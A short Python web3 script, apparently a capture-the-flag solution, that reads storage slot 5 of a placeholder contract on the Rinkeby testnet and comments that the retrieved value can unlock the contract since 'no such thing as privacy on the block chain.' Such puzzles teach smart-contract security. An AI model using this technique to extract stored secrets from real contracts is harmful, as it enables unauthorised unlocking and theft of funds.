from web3 import Web3, HTTPProvider


provider = Web3.HTTPProvider('rinkeby infura url goes here')
w3 = Web3(provider)
vic = Web3.toChecksumAddress("0xffffffffffffffffffffffffffffffffffffffff")
store = w3.eth.getStorageAt(vic, 5)
print(Web3.toHex(store))

#no such thing as privacy on the block chain. use this script to query the storage variables of the contract, then use metamask or a contract to unlock using the private key retreived. 
